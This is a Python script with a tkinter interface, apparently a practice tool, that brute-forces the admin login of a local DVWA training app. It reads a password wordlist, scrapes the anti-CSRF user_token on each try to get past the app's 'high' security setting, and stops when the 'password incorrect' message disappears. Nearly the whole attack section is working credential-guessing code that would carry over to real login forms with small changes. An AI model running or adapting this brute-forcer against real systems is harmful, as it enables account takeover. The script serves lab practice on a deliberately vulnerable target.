from utils import *
import sys

import tkinter as tk
from tkinter import ttk
from tkinter import *

import subprocess
import os

current_directory = os.getcwd()
process = None


found_password = ""

####ATTACK

def get_passwords(filename):
    q = []
    with open(filename, 'r') as f:
        for e in f.read().split("\n"):
            q.append(e)

    return q

def send_credentials(session, url, data):

    target_url = url
    for k, v in data.items():
        target_url+=f"{k}={v}&"
    target_url = target_url[:-1]+"#"
    response = session.get(target_url)   
    return response

def attack():
    BASE_URL = "http://127.0.0.1/dvwa"
    bruteforce_url = f"{BASE_URL}/vulnerabilities/brute?"
    filename = "password.txt"
    username = "admin"

    q = get_passwords(filename)

    with DVWASessionProxy(BASE_URL) as s:
        s.security = SecurityLevel.HIGH
        for password in q:
                      
            data = {
            "username": username,
            "password": password,
            "Login": "Login"
            }

            if s.security is SecurityLevel.HIGH.value:

                response = s.get(bruteforce_url)
                soup = BeautifulSoup(response.text, 'html.parser')
                user_token = soup.find("input", attrs= {"name": "user_token"})["value"]
                data["user_token"] = user_token
            response = send_credentials(s, bruteforce_url, data)
            print(" "*40, end="\r")
            print(f"[!] Testing: {password}", end="\r")

            update_running(password)
            
          #  listbox.insert("Testing", str(password))
            if "password incorrect." not in response.text:
                print("")
                print(f"[+] Found: {password}")
                found_password=password
                update_Result()
           #     listbox.insert("Found", str(password))
                break



def update_Result():
	rtext = " [FOUND:] ~ " + str(found_password)
	lb2.configure(text = rtext)


def update_running(password):
	rtext = " [Testing:] ~ " + str(password)
	lb1.configure(text = rtext)   

            

####

###GUI

def run_program():
    global process
    try:
        process = subprocess.Popen(["python3", current_directory+"/brute_force/brute_force_main.py"])
    except FileNotFoundError:
        print("Error: The specified Python program was not found.")
    except Exception as e:
        print("An error occurred:", e)

def stop_program():
    global process
    if process:
        process.terminate()
        process = None

def toggle_switch():
    global switch_state
    if switch_state:
        switch_button.config(text="RUN ATTACK", style="SwitchButton.Off.TButton")
        stop_program()
    else:
        switch_button.config(text="CANCEL ATTACK", style="SwitchButton.On.TButton")
        #run_program()
        attack()
    switch_state = not switch_state




global switch_state
switch_state = False

    # Create the main window
root = tk.Tk()
root.title("BRUTE FORCE ATTACK")
root.geometry("400x500")  # Width x Height
root.resizable(True,True)

    # Create the style for the switch button
style = ttk.Style()
style.configure("SwitchButton.On.TButton", foreground="red")
style.configure("SwitchButton.Off.TButton", foreground="green")

    # Create the switch (Button)
global switch_button
switch_button = ttk.Button(root, text="RUN ATTACK", style="SwitchButton.Off.TButton", command=toggle_switch)
switch_button.grid(ipadx=50, ipady=30 )
switch_button.place(x=150, y=50)
    # switch_button.pack(pady=50)


lb1 = Label(root,text="click_to_attack")
lb1.place(x=180, y=300)
lb1.pack()

lb2 = Label(root,text="")
lb2.place(x=180, y=350)
lb2.pack()

    # Run the main event loop
root.mainloop()

###

